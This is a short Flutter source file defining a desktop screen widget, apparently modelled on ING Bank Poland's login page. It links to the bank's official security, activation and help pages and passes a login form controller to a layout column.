
import 'package:flutter/material.dart';

import 'main_column.dart';


class DesktopScreen extends StatefulWidget {
  const DesktopScreen({super.key});

  @override
  State<DesktopScreen> createState() => _DesktopScreenState();
}

class _DesktopScreenState extends State<DesktopScreen> {
  
  @override
  Widget build(BuildContext context) {
    final width = MediaQuery.of(context).size.width;
    final Uri lock = Uri.parse(
        'https://www.ing.pl/indywidualni/bankowosc-internetowa/bezpieczenstwo');
    final Uri key =
        Uri.parse('https://www.ing.pl/indywidualni/odnosniki/aktywacja');
    final Uri urk = Uri.parse(
        'https://www.ing.pl/indywidualni/bankowosc-internetowa/centrum-pomocy');
    final Uri url = Uri.parse(
        'https://www.ing.pl/aktualnosci/bankowosc-elektroniczna?news_id=1105917-oszusci-wysylaja-mejle-podszywajace-sie-pod-bank?src=login');
    final GlobalKey<FormState> formKey = GlobalKey<FormState>();
    final TextEditingController loginController = TextEditingController();


    return  
     Padding(
       padding: const EdgeInsets.only(top:30.0,left:70,right: 70),
       child: SizedBox(
        
        child: MainColumn(context, width, formKey, loginController, urk, url,key, lock)),
     );
  }
}
